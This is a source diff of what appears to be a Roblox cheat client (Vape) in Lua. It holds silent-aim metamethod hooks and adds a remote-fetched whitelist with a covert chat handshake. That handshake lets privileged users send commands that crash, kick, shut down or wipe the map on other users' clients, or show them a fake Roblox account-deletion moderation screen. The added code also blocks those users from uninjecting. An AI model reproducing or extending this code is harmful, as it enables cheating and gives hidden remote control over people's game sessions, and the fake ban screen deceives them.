@@ -1,11 +1,12 @@
 local GuiLibrary = shared.GuiLibrary
 local playersService = game:GetService("Players")
+local coreGui = game:GetService("CoreGui")
 local textService = game:GetService("TextService")
 local lightingService = game:GetService("Lighting")
 local textChatService = game:GetService("TextChatService")
 local inputService = game:GetService("UserInputService")
 local runService = game:GetService("RunService")
-local replicatedStorageService = game:GetService("ReplicatedStorage")
+local replicatedStorage = game:GetService("ReplicatedStorage")
 local tweenService = game:GetService("TweenService")
 local gameCamera = workspace.CurrentCamera
 local lplr = playersService.LocalPlayer
@@ -23,7 +24,7 @@ end
 local networkownerswitch = tick()
 local isnetworkowner = function(part)
 	local suc, res = pcall(function() return gethiddenproperty(part, "NetworkOwnershipRule") end)
-	if suc and res == Enum.NetworkOwnership.Manual then 
+	if suc and res == Enum.NetworkOwnership.Manual then
 		sethiddenproperty(part, "NetworkOwnershipRule", Enum.NetworkOwnership.Automatic)
 		networkownerswitch = tick() + 8
 	end
@@ -34,14 +35,14 @@ local getcustomasset = getsynasset or getcustomasset or function(location) retur
 local queueonteleport = syn and syn.queue_on_teleport or queue_on_teleport or function() end
 local synapsev3 = syn and syn.toast_notification and "V3" or ""
 local worldtoscreenpoint = function(pos)
-	if synapsev3 == "V3" then 
+	if synapsev3 == "V3" then
 		local scr = worldtoscreen({pos})
 		return scr[1] - Vector3.new(0, 36, 0), scr[1].Z > 0
 	end
 	return gameCamera.WorldToScreenPoint(gameCamera, pos)
 end
 local worldtoviewportpoint = function(pos)
-	if synapsev3 == "V3" then 
+	if synapsev3 == "V3" then
 		local scr = worldtoscreen({pos})
 		return scr[1], scr[1].Z > 0
 	end
@@ -83,7 +84,7 @@ local function downloadVapeAsset(path)
         end
 	end
 	if not vapeCachedAssets[path] then vapeCachedAssets[path] = getcustomasset(path) end
-	return vapeCachedAssets[path] 
+	return vapeCachedAssets[path]
 end
 
 local function warningNotification(title, text, delay)
@@ -95,7 +96,12 @@ local function warningNotification(title, text, delay)
 	return (suc and res)
 end
 
-local function runFunction(func) func() end
+local function removeTags(str)
+	str = str:gsub("<br%s*/>", "\n")
+	return (str:gsub("<[^<>]->", ""))
+end
+
+local function run(func) func() end
 
 local function isFriend(plr, recolor)
 	if GuiLibrary.ObjectsThatCanBeSaved["Use FriendsToggle"].Api.Enabled then
@@ -126,6 +132,7 @@ local function getPlayerColor(plr)
 	return tostring(plr.TeamColor) ~= "White" and plr.TeamColor.Color
 end
 
+local whitelist = {data = {WhitelistedUsers = {}}, hashes = {}, said = {}, alreadychecked = {}, customtags = {}, loaded = false, localprio = 0, hooked = false, get = function() return 0, true end}
 local entityLibrary = loadstring(vapeGithubRequest("Libraries/entityHandler.lua"))()
 shared.vapeentity = entityLibrary
 do
@@ -139,7 +146,7 @@ do
 	local oldUpdateBehavior = entityLibrary.getUpdateConnections
 	entityLibrary.getUpdateConnections = function(newEntity)
 		local oldUpdateConnections = oldUpdateBehavior(newEntity)
-		table.insert(oldUpdateConnections, {Connect = function() 
+		table.insert(oldUpdateConnections, {Connect = function()
 			newEntity.Friend = isFriend(newEntity.Player) and true
 			newEntity.Target = isTarget(newEntity.Player) and true
 			return {Disconnect = function() end}
@@ -148,6 +155,7 @@ do
 	end
 	entityLibrary.isPlayerTargetable = function(plr)
 		if isFriend(plr) then return false end
+		if not ({whitelist:get(plr)})[2] then return false end
 		if (not GuiLibrary.ObjectsThatCanBeSaved["Teams by colorToggle"].Api.Enabled) then return true end
 		if (not lplr.Team) then return true end
 		if (not plr.Team) then return true end
@@ -163,13 +171,13 @@ do
 			task.wait()
 			if entityLibrary.isAlive then
 				table.insert(postable, {Time = tick(), Position = entityLibrary.character.HumanoidRootPart.Position})
-				if #postable > 100 then 
+				if #postable > 100 then
 					table.remove(postable, 1)
 				end
 				local closestmag = 9e9
 				local closestpos = entityLibrary.character.HumanoidRootPart.Position
 				local currenttime = tick()
-				for i, v in pairs(postable) do 
+				for i, v in pairs(postable) do
 					local mag = 0.1 - (currenttime - v.Time)
 					if mag < closestmag and mag > 0 then
 						closestmag = mag
@@ -202,15 +210,15 @@ end
 
 local raycastWallProperties = RaycastParams.new()
 local function raycastWallCheck(char, checktable)
-	if not checktable.IgnoreObject then 
+	if not checktable.IgnoreObject then
 		checktable.IgnoreObject = raycastWallProperties
 		local filter = {lplr.Character, gameCamera}
-		for i,v in pairs(entityLibrary.entityList) do 
-			if v.Targetable then 
+		for i,v in pairs(entityLibrary.entityList) do
+			if v.Targetable then
 				table.insert(filter, v.Character)
-			end 
+			end
 		end
-		for i,v in pairs(checktable.IgnoreTable or {}) do 
+		for i,v in pairs(checktable.IgnoreTable or {}) do
 			table.insert(filter, v)
 		end
 		raycastWallProperties.FilterDescendantsInstances = filter
@@ -237,7 +245,7 @@ local function EntityNearPosition(distance, checktab)
             end
         end
 		table.sort(sortedentities, function(a, b) return a.Magnitude < b.Magnitude end)
-		for i, v in pairs(sortedentities) do 
+		for i, v in pairs(sortedentities) do
 			if checktab.WallCheck then
 				if not raycastWallCheck(v.entity, checktab) then continue end
 			end
@@ -262,7 +270,7 @@ local function EntityNearMouse(distance, checktab)
             end
         end
 		table.sort(sortedentities, function(a, b) return a.Magnitude < b.Magnitude end)
-		for i, v in pairs(sortedentities) do 
+		for i, v in pairs(sortedentities) do
 			if checktab.WallCheck then
 				if not raycastWallCheck(v.entity, checktab) then continue end
 			end
@@ -291,7 +299,7 @@ local function AllNearPosition(distance, amount, checktab)
             end
         end
 		table.sort(sortedentities, function(a, b) return a.Magnitude < b.Magnitude end)
-		for i,v in pairs(sortedentities) do 
+		for i,v in pairs(sortedentities) do
 			if checktab.WallCheck then
 				if not raycastWallCheck(v.entity, checktab) then continue end
 			end
@@ -303,77 +311,389 @@ local function AllNearPosition(distance, amount, checktab)
 	return returnedplayer
 end
 
-local WhitelistFunctions = {StoredHashes = {}, WhitelistTable = {WhitelistedUsers = {}}, Loaded = false, CustomTags = {}, LocalPriority = 0}
-do
-	local shalib
-
-	task.spawn(function()
-		local whitelistloaded
-		whitelistloaded = pcall(function()
-			local commit = "main"
-			for i,v in pairs(game:HttpGet("https://github.com/7GrandDadPGN/whitelists"):split("\n")) do 
-				if v:find("commit") and v:find("fragment") then 
-					local str = v:split("/")[5]
-					commit = str:sub(0, str:find('"') - 1)
-					break
-				end
-			end
-			WhitelistFunctions.WhitelistTable = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/whitelists/"..commit.."/PlayerWhitelist.json", true))
-		end)
-		shalib = loadstring(vapeGithubRequest("Libraries/sha.lua"))()
-		if not whitelistloaded or not shalib then return end
-		WhitelistFunctions.Loaded = true
-		WhitelistFunctions.LocalPriority = WhitelistFunctions:GetWhitelist(lplr)
-		entityLibrary.fullEntityRefresh()
-	end)
-
-	function WhitelistFunctions:GetWhitelist(plr)
-		local plrstr = WhitelistFunctions:Hash(plr.Name..plr.UserId)
-		for i,v in pairs(WhitelistFunctions.WhitelistTable.WhitelistedUsers) do
+local sha = loadstring(vapeGithubRequest("Libraries/sha.lua"))()
+run(function()
+	local olduninject
+	function whitelist:get(plr)
+		local plrstr = self:hash(plr.Name..plr.UserId)
+		for i,v in self.data.WhitelistedUsers do
 			if v.hash == plrstr then
-				return v.level, v.attackable or WhitelistFunctions.LocalPriority > v.level, v.tags
+				return v.level, v.attackable or whitelist.localprio >= v.level, v.tags
 			end
 		end
 		return 0, true
 	end
 
-	function WhitelistFunctions:GetTag(plr)
-		local plrstr, plrattackable, plrtag = WhitelistFunctions:GetWhitelist(plr)
-		local hash = WhitelistFunctions:Hash(plr.Name..plr.UserId)
-		local newtag = WhitelistFunctions.CustomTags[plr.Name] or ""
-		if plrtag then
-			for i2,v2 in pairs(plrtag) do
-				newtag = newtag..'['..v2.text..'] '
-			end
-		end
-		return newtag
-	end
-
-	function WhitelistFunctions:Hash(str)
-		if WhitelistFunctions.StoredHashes[str] == nil and shalib then
-			WhitelistFunctions.StoredHashes[str] = shalib.sha512(str.."SelfReport")
-		end
-		return WhitelistFunctions.StoredHashes[str] or ""
-	end
-
-	function WhitelistFunctions:CheckWhitelisted(plr)
-		local playertype = WhitelistFunctions:GetWhitelist(plr)
-		if playertype ~= 0 then 
-			return true
-		end
-		return false
-	end
-
-	function WhitelistFunctions:IsSpecialIngame()
-		for i,v in pairs(playersService:GetPlayers()) do 
-			if WhitelistFunctions:CheckWhitelisted(v) then 
+	function whitelist:isingame()
+		for i, v in playersService:GetPlayers() do
+			if self:get(v) ~= 0 then
 				return true
 			end
 		end
 		return false
 	end
-end
-shared.vapewhitelist = WhitelistFunctions
+
+	function whitelist:tag(plr, text, rich)
+		local plrtag = ({self:get(plr)})[3] or self.customtags[plr.Name] or {}
+		if not text then return plrtag end
+		local newtag = ''
+		for i, v in plrtag do
+			newtag = newtag..(rich and '<font color="#'..v.color:ToHex()..'">['..v.text..']</font>' or '['..removeTags(v.text)..']')..' '
+		end
+		return newtag
+	end
+
+	function whitelist:hash(str)
+		if self.hashes[str] == nil and sha then
+			self.hashes[str] = sha.sha512(str..'SelfReport')
+		end
+		return self.hashes[str] or ''
+	end
+
+	function whitelist:getplayer(arg)
+		if arg == 'default' and self.localprio == 0 then return true end
+		if arg == 'private' and self.localprio == 1 then return true end
+		if arg and lplr.Name:lower():sub(1, arg:len()) == arg:lower() then return true end
+		return false
+	end
+
+	function whitelist:playeradded(v, joined)
+		if self:get(v) ~= 0 then
+			if self.alreadychecked[v.UserId] then return end
+			self.alreadychecked[v.UserId] = true
+			self:hook()
+			if self.localprio == 0 then
+				olduninject = GuiLibrary.SelfDestruct
+				GuiLibrary.SelfDestruct = function() warningNotification('Vape', 'No escaping the private members :)', 10) end
+				if joined then task.wait(10) end
+				if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+					local oldchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
+					local newchannel = cloneref(game:GetService('RobloxReplicatedStorage')).ExperienceChat.WhisperChat:InvokeServer(v.UserId)
+					if newchannel then newchannel:SendAsync('helloimusinginhaler') end
+					textChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
+				elseif replicatedStorage:FindFirstChild('DefaultChatSystemChatEvents') then
+					replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('/w '..v.Name..' helloimusinginhaler', 'All')
+				end
+			end
+		end
+	end
+
+	function whitelist:checkmessage(msg, plr)
+		local otherprio = self:get(plr)
+		if plr == lplr and msg == 'helloimusinginhaler' then return true end
+		if self.localprio > 0 and self.said[plr.Name] == nil and msg == 'helloimusinginhaler' and plr ~= lplr then
+			self.said[plr.Name] = true
+			notif('Vape', plr.Name..' is using vape!', 60)
+			self.customtags[plr.Name] = {{text = 'VAPE USER', color = Color3.new(1, 1, 0)}}
+			local newent = entityLibrary.getEntity(plr)
+			if newent then entityLibrary.Events.EntityUpdated:Fire(newent) end
+			return true
+		end
+		if self.localprio < otherprio or plr == lplr then
+			local args = msg:split(' ')
+			table.remove(args, 1)
+			if self:getplayer(args[1]) then
+				table.remove(args, 1)
+				for i,v in self.commands do
+					if msg:len() >= (i:len() + 1) and msg:sub(1, i:len() + 1):lower() == ";"..i:lower() then
+						v(plr, args)
+						return true
+					end
+				end
+			end
+		end
+		return false
+	end
+
+	function whitelist:newchat(obj, plr, skip)
+		obj.Text = self:tag(plr, true, true)..obj.Text
+		local sub = obj.ContentText:find(': ')
+		if sub then
+			if not skip and self:checkmessage(obj.ContentText:sub(sub + 3, #obj.ContentText), plr) then
+				obj.Visible = false
+			end
+		end
+	end
+
+	function whitelist:oldchat(func)
+		local msgtable = debug.getupvalue(func, 3)
+		if typeof(msgtable) == 'table' and msgtable.CurrentChannel then
+			whitelist.oldchattable = msgtable
+		end
+		local oldchat
+
+		oldchat = hookfunction(func, function(data, ...)
+			local plr = playersService:GetPlayerByUserId(data.SpeakerUserId)
+			if plr then
+				data.ExtraData.Tags = data.ExtraData.Tags or {}
+				for i, v in self:tag(plr) do
+					table.insert(data.ExtraData.Tags, {TagText = v.text, TagColor = v.color})
+				end
+				if data.Message and self:checkmessage(data.Message, plr) then data.Message = '' end
+			end
+			return oldchat(data, ...)
+		end)
+		table.insert(vapeConnections, {Disconnect = function() hookfunction(func, oldchat) end})
+	end
+
+	function whitelist:hook()
+		if self.hooked then return end
+		self.hooked = true
+		local exp = coreGui:FindFirstChild('ExperienceChat')
+		if exp then
+			local bubblechat = exp:WaitForChild('bubbleChat', 5)
+			if bubblechat then
+				table.insert(vape.Connections, bubblechat.DescendantAdded:Connect(function(newbubble)
+					if newbubble:IsA('TextLabel') and newbubble.Text:find('helloimusinginhaler') then
+						newbubble.Parent.Parent.Visible = false
+					end
+				end))
+			end
+		end
+		if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+			if exp then
+				table.insert(vape.Connections, exp:FindFirstChild('RCTScrollContentView', true).ChildAdded:Connect(function(obj)
+					local plr = playersService:GetPlayerByUserId(tonumber(obj.Name:split('-')[1]) or 0)
+					obj = obj:FindFirstChild('TextMessage', true)
+					if obj then
+						if plr then
+							self:newchat(obj, plr, true)
+							obj:GetPropertyChangedSignal('Text'):Wait()
+							self:newchat(obj, plr)
+						end
+						if obj.ContentText:sub(1, 35) == 'You are now privately chatting with' then
+							obj.Visible = false
+						end
+					end
+				end))
+			end
+		elseif replicatedStorage:FindFirstChild('DefaultChatSystemChatEvents') then
+			pcall(function()
+				for i, v in getconnections(replicatedStorage.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent) do
+					if table.find(debug.getconstants(v.Function), 'UpdateMessagePostedInChannel') then
+						whitelist:oldchat(v.Function)
+						break
+					end
+				end
+				for i, v in getconnections(replicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent) do
+					if table.find(debug.getconstants(v.Function), 'UpdateMessageFiltered') then
+						whitelist:oldchat(v.Function)
+						break
+					end
+				end
+			end)
+		end
+	end
+
+	function whitelist:check(first)
+		local whitelistloaded = pcall(function()
+			local subbed = game:HttpGet('https://github.com/7GrandDadPGN/whitelists'):sub(130000, 137000)
+			local commit = subbed:find('spoofed_commit_check')
+			commit = commit and subbed:sub(commit + 21, commit + 60) or 'main'
+			whitelist.textdata = game:HttpGet('https://raw.githubusercontent.com/7GrandDadPGN/whitelists/'..commit..'/PlayerWhitelist.json', true)
+		end)
+		if not whitelistloaded or not sha or not whitelist.get then return true end
+		whitelist.loaded = true
+		if not first or whitelist.textdata ~= whitelist.olddata then
+			if not first then
+				whitelist.olddata = isfile('newvape/profiles/whitelist.json') and readfile('newvape/profiles/whitelist.json') or nil
+			end
+			whitelist.data = game:GetService('HttpService'):JSONDecode(whitelist.textdata)
+			whitelist.localprio = whitelist:get(lplr)
+
+			for i, v in whitelist.data.WhitelistedUsers do
+				if v.tags then
+					for i2, v2 in v.tags do
+						v2.color = Color3.fromRGB(unpack(v2.color))
+					end
+				end
+			end
+
+			for i, v in playersService:GetPlayers() do whitelist:playeradded(v) end
+			if not whitelist.connection then
+				whitelist.connection = playersService.PlayerAdded:Connect(function(v) whitelist:playeradded(v, true) end)
+			end
+			if (entityLibrary.isAlive or #entityLibrary.entityList > 0) then
+				entityLibrary.fullEntityRefresh()
+			end
+
+			if whitelist.textdata ~= whitelist.olddata then
+				if whitelist.data.Announcement.expiretime > os.time() then
+					local targets = whitelist.data.Announcement.targets == 'all' and {tostring(lplr.UserId)} or targets:split(',')
+					if table.find(targets, tostring(lplr.UserId)) then
+						local hint = Instance.new('Hint')
+						hint.Text = 'VAPE ANNOUNCEMENT: '..whitelist.data.Announcement.text
+						hint.Parent = workspace
+						game:GetService('Debris'):AddItem(hint, 20)
+					end
+				end
+				whitelist.olddata = whitelist.textdata
+				pcall(function() writefile('newvape/profiles/whitelist.json', whitelist.textdata) end)
+			end
+
+			if whitelist.data.KillVape then
+				GuiLibrary.SelfDestruct()
+				return true
+			end
+
+			if whitelist.data.BlacklistedUsers[tostring(lplr.UserId)] then
+				task.spawn(lplr.kick, lplr, whitelist.data.BlacklistedUsers[tostring(lplr.UserId)])
+				return true
+			end
+		end
+	end
+
+	whitelist.commands = {
+		byfron = function()
+			task.spawn(function()
+				if vape.ThreadFix and setthreadcaps then setthreadcaps(8) end
+				local UIBlox = getrenv().require(game:GetService('CorePackages').UIBlox)
+				local Roact = getrenv().require(game:GetService('CorePackages').Roact)
+				UIBlox.init(getrenv().require(game:GetService('CorePackages').Workspace.Packages.RobloxAppUIBloxConfig))
+				local auth = getrenv().require(coreGui.RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
+				local darktheme = getrenv().require(game:GetService('CorePackages').Workspace.Packages.Style).Themes.DarkTheme
+				local gotham = getrenv().require(game:GetService('CorePackages').Workspace.Packages.Style).Fonts.Gotham
+				local tLocalization = getrenv().require(game:GetService('CorePackages').Workspace.Packages.RobloxAppLocales).Localization
+				local a = getrenv().require(game:GetService('CorePackages').Workspace.Packages.Localization).LocalizationProvider
+				lplr.PlayerGui:ClearAllChildren()
+				vape.gui.Enabled = false
+				coreGui:ClearAllChildren()
+				lightingService:ClearAllChildren()
+				for i, v in workspace:GetChildren() do pcall(function() v:Destroy() end) end
+				task.wait(0.2)
+				lplr.kick(lplr)
+				guiService:ClearError()
+				task.wait(2)
+				local gui = Instance.new('ScreenGui')
+				gui.IgnoreGuiInset = true
+				gui.Parent = coreGui
+				local frame = Instance.new('ImageLabel')
+				frame.BorderSizePixel = 0
+				frame.Size = UDim2.fromScale(1, 1)
+				frame.BackgroundColor3 = Color3.new(1, 1, 1)
+				frame.ScaleType = Enum.ScaleType.Crop
+				frame.Parent = gui
+				task.delay(0.1, function() frame.Image = 'rbxasset://textures/ui/LuaApp/graphic/Auth/GridBackground.jpg' end)
+				task.delay(2, function()
+					local e = Roact.createElement(auth, {
+						style = {},
+						screenSize = gameCamera.ViewportSize or Vector2.new(1920, 1080),
+						moderationDetails = {
+							punishmentTypeDescription = 'Delete',
+							beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
+							reactivateAccountActivated = true,
+							badUtterances = {{abuseType = 'ABUSE_TYPE_CHEAT_AND_EXPLOITS', utteranceText = 'ExploitDetected - Place ID : '..game.PlaceId}},
+							messageToUser = 'Roblox does not permit the use of third-party software to modify the client.'
+						},
+						termsActivated = function() end,
+						communityGuidelinesActivated = function() end,
+						supportFormActivated = function() end,
+						reactivateAccountActivated = function() end,
+						logoutCallback = function() end,
+						globalGuiInset = {top = 0}
+					})
+					local screengui = Roact.createElement('ScreenGui', {}, Roact.createElement(a, {
+							localization = tLocalization.new('en-us')
+						}, {Roact.createElement(UIBlox.Style.Provider, {
+								style = {
+									Theme = darktheme,
+									Font = gotham
+								},
+							}, {e})}))
+					Roact.mount(screengui, coreGui)
+				end)
+			end)
+		end,
+		crash = function()
+			task.spawn(setfpscap, 9e9)
+			task.spawn(function() repeat until false end)
+		end,
+		deletemap = function()
+			local terrain = workspace:FindFirstChildWhichIsA('Terrain')
+			if terrain then terrain:Clear() end
+			for i, v in workspace:GetChildren() do
+				if v ~= terrain and not v:FindFirstChildWhichIsA('Humanoid') and not v:IsA('Camera') then
+					v:Destroy()
+				end
+			end
+		end,
+		framerate = function(sender, args)
+			if #args < 1 or not setfpscap then return end
+			setfpscap(tonumber(args[1]) ~= '' and math.clamp(tonumber(args[1]) or 9999, 1, 9999) or 9999)
+		end,
+		gravity = function(sender, args)
+			workspace.Gravity = tonumber(args[1]) or workspace.Gravity
+		end,
+		jump = function()
+			if entityLibrary.isAlive and entityLibrary.character.Humanoid.FloorMaterial ~= Enum.Material.Air then
+				entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+			end
+		end,
+		kick = function(sender, args)
+			task.spawn(function() lplr:Kick(table.concat(args, ' ')) end)
+		end,
+		kill = function()
+			entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
+		end,
+		reveal = function(args)
+			task.delay(0.1, function()
+				if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+                    textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync('I am using the inhaler client')
+                else
+                    replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('I am using the inhaler client', 'All')
+                end
+			end)
+		end,
+		shutdown = function()
+			game:Shutdown()
+		end,
+		toggle = function(sender, args)
+			if #args < 1 then return end
+			if args[1]:lower() == 'all' then
+				for i, v in vape.Modules do
+					if i ~= 'Panic' and i ~= 'ServerHop' then v:ToggleButton(false) end
+				end
+			else
+				for i, v in vape.Modules do
+					if i:lower() == args[1]:lower() then
+						v:ToggleButton(false)
+						break
+					end
+				end
+			end
+		end,
+		trip = function()
+			if entityLibrary.isAlive then
+				entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Ragdoll)
+			end
+		end,
+		uninject = function()
+			if olduninject then
+				olduninject(vape)
+			else
+				GuiLibrary.SelfDestruct()
+			end
+		end,
+		void = function()
+			if entityLibrary.isAlive then
+				entityLibrary.character.RootPart.CFrame = entityLibrary.character.RootPart.CFrame + Vector3.new(0, -1000, 0)
+			end
+		end
+	}
+
+	task.spawn(function()
+		repeat
+			if whitelist:check(whitelist.loaded) then return end
+			task.wait(10)
+		until shared.VapeInjected == nil
+	end)
+	table.insert(vapeConnections, {Disconnect = function()
+		table.clear(whitelist.commands)
+		table.clear(whitelist.data)
+		table.clear(whitelist)
+	end})
+end)
+shared.vapewhitelist = whitelist
 
 local RunLoops = {RenderStepTable = {}, StepTable = {}, HeartTable = {}}
 do
@@ -426,16 +746,16 @@ GuiLibrary.SelfDestructEvent.Event:Connect(function()
 	end
 end)
 
-runFunction(function()
+run(function()
 	local radargameCamera = Instance.new("Camera")
 	radargameCamera.FieldOfView = 45
 	local Radar = GuiLibrary.CreateCustomWindow({
-		Name = "Radar", 
+		Name = "Radar",
 		Icon = "vape/assets/RadarIcon1.png",
 		IconSize = 16
 	})
 	local RadarColor = Radar.CreateColorSlider({
-		Name = "Player Color", 
+		Name = "Player Color",
 		Function = function(val) end
 	})
 	local RadarFrame = Instance.new("Frame")
@@ -483,12 +803,12 @@ runFunction(function()
 		RadarFrame.Position = UDim2.new(0, 0, 0, (Radar.GetCustomChildren().Parent.Size.Y.Offset == 0 and 45 or 0))
 	end))
 	GuiLibrary.ObjectsThatCanBeSaved.GUIWindow.Api.CreateCustomToggle({
-		Name = "Radar", 
-		Icon = "vape/assets/RadarIcon2.png", 
+		Name = "Radar",
+		Icon = "vape/assets/RadarIcon2.png",
 		Function = function(callback)
-			Radar.SetVisible(callback) 
+			Radar.SetVisible(callback)
 			if callback then
-				RunLoops:BindToRenderStep("Radar", function() 
+				RunLoops:BindToRenderStep("Radar", function()
 					if entityLibrary.isAlive then
 						local v278 = (CFrame.new(0, 0, 0):inverse() * entityLibrary.character.HumanoidRootPart.CFrame).p * 0.2 * Vector3.new(1, 1, 1);
 						local v279, v280, v281 = gameCamera.CFrame:ToOrientation();
@@ -517,14 +837,14 @@ runFunction(function()
 								thing.Parent = RadarMainFrame
 								radartable[plr] = thing
 							end
-							
+
 							local v238, v239 = radargameCamera:WorldToViewportPoint((CFrame.new(0, 0, 0):inverse() * plr.RootPart.CFrame).p * 0.2)
 							thing.Visible = true
 							thing.BackgroundColor3 = getPlayerColor(plr.Player) or Color3.fromHSV(RadarColor.Value, 1, 1)
 							thing.Position = UDim2.new(math.clamp(v238.X, 0.03, 0.97), -2, math.clamp(v238.Y, 0.03, 0.97), -2)
 						end
-						for i, v in pairs(radartable) do 
-							if not table.find(done, i) then 
+						for i, v in pairs(radartable) do
+							if not table.find(done, i) then
 								radartable[i] = nil
 								v:Destroy()
 							end
@@ -536,12 +856,12 @@ runFunction(function()
 				RadarMainFrame:ClearAllChildren()
 				table.clear(radartable)
 			end
-		end, 
+		end,
 		Priority = 1
 	})
 end)
 
-runFunction(function()
+run(function()
 	local SilentAimSmartWallTable = {}
 	local SilentAim = {Enabled = false}
 	local SilentAimFOV = {Value = 1}
@@ -578,10 +898,10 @@ runFunction(function()
 		local newVelocity = vel.Y
 		GravityRaycast.FilterDescendantsInstances = {targetPart.Character}
 		local rootSize = (targetPart.Humanoid.HipHeight + (targetPart.RootPart.Size.Y / 2))
-		for i = 1, math.floor(mag / 0.016) do 
+		for i = 1, math.floor(mag / 0.016) do
 			newVelocity = newVelocity - (Gravity * 0.016)
 			local floorDetection = workspace:Raycast(pos, Vector3.new(0, (newVelocity * 0.016) - rootSize, 0), GravityRaycast)
-			if floorDetection then 
+			if floorDetection then
 				pos = Vector3.new(pos.X, floorDetection.Position.Y + rootSize, pos.Z)
 				break
 			end
@@ -623,12 +943,12 @@ runFunction(function()
 
 	local function canClick()
 		local mousepos = inputService:GetMouseLocation() - Vector2.new(0, 36)
-		for i,v in pairs(lplr.PlayerGui:GetGuiObjectsAtPosition(mousepos.X, mousepos.Y)) do 
+		for i,v in pairs(lplr.PlayerGui:GetGuiObjectsAtPosition(mousepos.X, mousepos.Y)) do
 			if v.Active and v.Visible and v:FindFirstAncestorOfClass("ScreenGui").Enabled then
 				return false
 			end
 		end
-		for i,v in pairs(game:GetService("CoreGui"):GetGuiObjectsAtPosition(mousepos.X, mousepos.Y)) do 
+		for i,v in pairs(game:GetService("CoreGui"):GetGuiObjectsAtPosition(mousepos.X, mousepos.Y)) do
 			if v.Active and v.Visible and v:FindFirstAncestorOfClass("ScreenGui").Enabled then
 				return false
 			end
@@ -664,13 +984,13 @@ runFunction(function()
 			SilentAimShot = plr
 			SlientAimShotTick = tick() + 1
 			local direction = CFrame.lookAt(origin, targetPart.Position)
-			if SilentAimProjectile.Enabled then 
+			if SilentAimProjectile.Enabled then
 				local targetPosition, targetVelocity = targetPart.Position, targetPart.Velocity
-				if SilentAimProjectilePredict.Enabled then 
+				if SilentAimProjectilePredict.Enabled then
 					targetPosition, targetVelocity = predictGravity(targetPosition, targetVelocity, (targetPosition - origin).Magnitude / SilentAimProjectileSpeed.Value, plr, workspace.Gravity)
 				end
 				local calculated = LaunchDirection(origin, FindLeadShot(targetPosition, targetVelocity, SilentAimProjectileSpeed.Value, origin, Vector3.zero, SilentAimProjectileGravity.Value), SilentAimProjectileSpeed.Value,  SilentAimProjectileGravity.Value, false)
-				if calculated then 
+				if calculated then
 					direction = CFrame.lookAt(origin, origin + calculated)
 				end
 			end
@@ -701,13 +1021,13 @@ runFunction(function()
 			SilentAimShot = plr
 			SlientAimShotTick = tick() + 1
 			local direction = CFrame.lookAt(origin, targetPart.Position)
-			if SilentAimProjectile.Enabled then 
+			if SilentAimProjectile.Enabled then
 				local targetPosition, targetVelocity = targetPart.Position, targetPart.Velocity
-				if SilentAimProjectilePredict.Enabled then 
+				if SilentAimProjectilePredict.Enabled then
 					targetPosition, targetVelocity = predictGravity(targetPosition, targetVelocity, (targetPosition - origin).Magnitude / SilentAimProjectileSpeed.Value, plr, workspace.Gravity)
 				end
 				local calculated = LaunchDirection(origin, FindLeadShot(targetPosition, targetVelocity, SilentAimProjectileSpeed.Value, origin, Vector3.zero, SilentAimProjectileGravity.Value), SilentAimProjectileSpeed.Value,  SilentAimProjectileGravity.Value, false)
-				if calculated then 
+				if calculated then
 					direction = CFrame.lookAt(origin, origin + calculated)
 				end
 			end
@@ -742,14 +1062,14 @@ runFunction(function()
 			SilentAimShot = plr
 			SlientAimShotTick = tick() + 1
 			local direction = CFrame.lookAt(origin, targetPart.Position)
-			if SilentAimProjectile.Enabled then 
-				if SilentAimProjectile.Enabled then 
+			if SilentAimProjectile.Enabled then
+				if SilentAimProjectile.Enabled then
 					local targetPosition, targetVelocity = targetPart.Position, targetPart.Velocity
-					if SilentAimProjectilePredict.Enabled then 
+					if SilentAimProjectilePredict.Enabled then
 						targetPosition, targetVelocity = predictGravity(targetPosition, targetVelocity, (targetPosition - origin).Magnitude / SilentAimProjectileSpeed.Value, plr, workspace.Gravity)
 					end
 					local calculated = LaunchDirection(origin, FindLeadShot(targetPosition, targetVelocity, SilentAimProjectileSpeed.Value, origin, Vector3.zero, SilentAimProjectileGravity.Value), SilentAimProjectileSpeed.Value,  SilentAimProjectileGravity.Value, false)
-					if calculated then 
+					if calculated then
 						direction = CFrame.lookAt(origin, origin + calculated)
 					end
 				end
@@ -769,14 +1089,14 @@ runFunction(function()
 				oldnamecall = hookmetamethod(game, "__namecall", function(self, ...)
 					if getnamecallmethod() ~= SilentAimMethod.Value then
 						return oldnamecall(self, ...)
-					end 
+					end
 					if checkcaller() then
 						return oldnamecall(self, ...)
 					end
 					if not SilentAim.Enabled then
 						return oldnamecall(self, ...)
 					end
-					local calling = getcallingscript() 
+					local calling = getcallingscript()
 					if calling then
 						local list = #SilentAimIgnoredScripts.ObjectList > 0 and SilentAimIgnoredScripts.ObjectList or {"ControlScript", "ControlModule"}
 						if table.find(list, tostring(calling)) then
@@ -785,7 +1105,7 @@ runFunction(function()
 					end
 					local Args = {...}
 					local res = SilentAimFunctions[SilentAimMethod.Value](Args)
-					if res then 
+					if res then
 						return unpack(res)
 					end
 					return oldnamecall(self, unpack(Args))
@@ -797,7 +1117,7 @@ runFunction(function()
 				SilentAimHooked = true
 				local oldnamecall
 				oldnamecall = hookmetamethod(game, "__namecall", getfilter(SilentAimFilterObject, function(self, ...) return oldnamecall(self, ...) end, function(self, ...)
-					local calling = getcallingscript() 
+					local calling = getcallingscript()
 					if calling then
 						local list = #SilentAimIgnoredScripts.ObjectList > 0 and SilentAimIgnoredScripts.ObjectList or {"ControlScript", "ControlModule"}
 						if table.find(list, tostring(calling)) then
@@ -806,7 +1126,7 @@ runFunction(function()
 					end
 					local Args = {...}
